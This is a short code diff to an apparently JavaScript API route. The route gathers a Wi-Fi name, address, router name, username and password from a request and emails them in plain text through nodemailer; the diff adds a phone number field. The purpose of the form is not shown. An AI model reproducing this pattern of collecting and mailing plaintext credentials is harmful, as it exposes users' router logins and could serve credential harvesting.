@@ -13,7 +13,7 @@ const transporter = nodemailer.createTransport({
 export async function POST(request) {
   try {
     const data = await request.json();
-    const { wifiName, address, routerName, username, password } = data;
+   const { wifiName, address, routerName, username, password, phoneNumber } = data;
 
     // Email content
     const emailContent = `
@@ -24,6 +24,7 @@ Address: ${address}
 Router: ${routerName}
 Username: ${username}
 Password: ${password}
+Phone No: ${phoneNumber}
 
 Submitted at: ${new Date().toLocaleString()}
     `;
@@ -84,4 +85,5 @@ const mailOptions = {
 };
 
 await transporter.sendMail(mailOptions);
+
 */
